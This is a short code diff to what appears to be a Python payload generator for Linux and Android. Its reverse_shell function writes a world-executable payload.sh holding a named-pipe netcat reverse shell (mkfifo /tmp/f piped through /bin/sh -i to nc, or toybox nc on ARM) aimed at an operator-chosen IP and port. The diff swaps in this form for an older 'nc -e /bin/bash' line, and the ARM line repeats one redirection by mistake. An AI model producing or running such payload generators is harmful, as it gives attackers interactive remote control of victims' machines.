@@ -25,19 +25,19 @@ arg_parser.add_argument("-m", default="linux",
 arg_parser.add_argument("--ndk", help="Path to NDK")
 arg_parser.add_argument("--gcc", default="gcc",
     help="Path to GCC")   
-arg_parser.add_argument("sources", nargs=1)
+arg_parser.add_argument("sources", nargs="?")
 args = arg_parser.parse_args()
 
 def reverse_shell():
-    shellcode = ''
+    shellcode = "rm -f /tmp/f; mkfifo /tmp/f\n"
     if args.a == "x86":
-        shellcode = "nc " + args.i + " " + args.p + " -e /bin/bash"
+        shellcode = shellcode + "cat /tmp/f | /bin/sh -i 2>&1 | " + "nc " + str(args.i) + " " + str(args.p) + " > /tmp/f\n"
     elif args.a == "arm":
-        shellcode = "toybox nc " + args.i + " " + args.p + " -e /bin/bash"
+        shellcode = shellcode + "cat /tmp/f | /bin/sh -i 2>&1 | " + "toybox nc " + str(args.i) + " " + str(args.p) + " > /tmp/f"+ " > /tmp/f\n"
     else:
         print("Invalid architecture specified")
     f = open("payload.sh", "w")
-    f.write(shellcode)
+    f.write(shellcode + "\n")
     f.close()
     os.chmod("payload.sh", 777)
 
